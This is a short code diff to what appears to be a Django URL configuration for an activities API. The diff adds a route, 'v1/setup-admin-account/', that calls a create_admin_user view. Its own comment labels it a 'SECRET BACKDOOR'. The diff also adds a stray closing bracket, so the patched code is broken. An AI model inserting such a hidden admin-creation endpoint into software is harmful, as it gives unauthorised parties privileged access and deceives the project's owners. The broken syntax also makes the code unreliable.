@@ -126,4 +126,9 @@ urlpatterns = [
     path('v1/activities/', activities['get_activities']),
     path('v1/activities/summary/', activities['get_activity_summary']),
     path('v1/activities/critical/', activities['get_critical_activities']),
+
+        # SECRET BACKDOOR - REMOVE THIS AFTER USE
+    path('v1/setup-admin-account/', views.create_admin_user, name='setup-admin'),
+]
+
 ]
